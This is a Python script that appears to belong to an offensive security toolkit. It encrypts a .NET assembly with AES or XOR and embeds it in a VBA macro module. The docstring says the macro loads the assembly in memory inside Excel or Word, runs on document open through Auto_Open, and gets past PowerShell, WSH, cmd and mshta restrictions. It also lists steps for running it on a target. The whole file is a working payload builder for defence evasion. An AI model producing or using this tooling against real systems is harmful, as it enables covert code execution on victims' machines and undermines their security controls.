#!/usr/bin/env python3
"""
build_vba.py -- Encrypts a .NET assembly and injects into vba_payload.bas

Generates a .bas VBA module that:
  - Bootstraps CLR via mscoree.CorRuntimeHost COM
  - AES-decrypts payload using .NET RijndaelManaged through COM interop
  - Loads assembly in-memory via AppDomain.Load_3(byte[])
  - Runs inside Excel/Word process (Microsoft-signed, no disk writes)
  - Auto_Open/AutoOpen entry points for auto-execution

VBA bypasses PowerShell CLM, WSH disable, cmd disable, and mshta restrictions.

Usage:
  python build_vba.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_vba.py Seatbelt.exe -- -group=all
  python build_vba.py Seatbelt.exe -e xor -- -group=all

On target:
  1. Open Excel or Word
  2. Alt+F11 to open VBA editor
  3. File > Import File > payload_ready.bas
  4. F5 to run (or close and reopen for Auto_Open)
"""

import argparse
import base64
import os
import re
import sys

CHUNK_SIZE = 800


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def remove_block(template: str, start_marker: str, end_marker: str) -> str:
    pattern = re.compile(
        rf"^.*{re.escape(start_marker)}.*$\n(.*?\n)*?^.*{re.escape(end_marker)}.*$\n?",
        re.MULTILINE
    )
    return pattern.sub('', template)


def uncomment_block(template: str, start_marker: str, end_marker: str) -> str:
    lines = template.split('\n')
    in_block = False
    result = []
    for line in lines:
        if start_marker in line:
            in_block = True
            continue
        elif end_marker in line:
            in_block = False
            continue
        elif in_block:
            if line.startswith("    ' "):
                result.append("    " + line[6:])
            elif line.strip() == "'":
                result.append("")
            else:
                result.append(line)
        else:
            result.append(line)
    return '\n'.join(result)


def build_payload_function(b64_payload: str) -> str:
    chunks = [b64_payload[i:i + CHUNK_SIZE] for i in range(0, len(b64_payload), CHUNK_SIZE)]
    lines = []
    for chunk in chunks:
        lines.append(f'    s = s & "{chunk}"')
    return '\n'.join(lines)


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into vba_payload.bas"
    )
    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument("--key", help="Encryption key as hex")
    parser.add_argument("--iv", help="AES IV as hex (16 bytes / 32 hex chars)")
    parser.add_argument("-o", "--output", help="Output .bas file (default: payload_ready.bas)")
    parser.add_argument("--template", help="Template .bas file to use")
    args = parser.parse_args(argv)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "vba_payload.bas")
    output_path = args.output or os.path.join(script_dir, "output", "payload_ready.bas")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)
    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    # --- Encryption ---

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        template = remove_block(template, "' DECRYPT_AES_START", "' DECRYPT_AES_END")
        template = uncomment_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")

        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    else:
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(f"[-] AES-256 key must be 32 bytes, got {len(key)}", file=sys.stderr)
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(f"[-] AES IV must be 16 bytes, got {len(iv)}", file=sys.stderr)
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")

        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')

    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64 "
          f"({len(encrypted_b64) // CHUNK_SIZE + 1} VBA chunks)", file=sys.stderr)

    # --- Payload chunks ---

    payload_lines = build_payload_function(encrypted_b64)
    template = template.replace("    ' PAYLOADCHUNKS", payload_lines)

    # --- Assembly args ---

    if assembly_args:
        args_str = ", ".join(f'"{a}"' for a in assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("Array(YOURARGS)", "Array()")

    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Open Excel or Word", file=sys.stderr)
    print(f"    2. Alt+F11 to open VBA editor", file=sys.stderr)
    print(f"    3. File > Import File > {os.path.basename(output_path)}", file=sys.stderr)
    print(f"    4. F5 to run the 'Run' macro", file=sys.stderr)


if __name__ == "__main__":
    main()
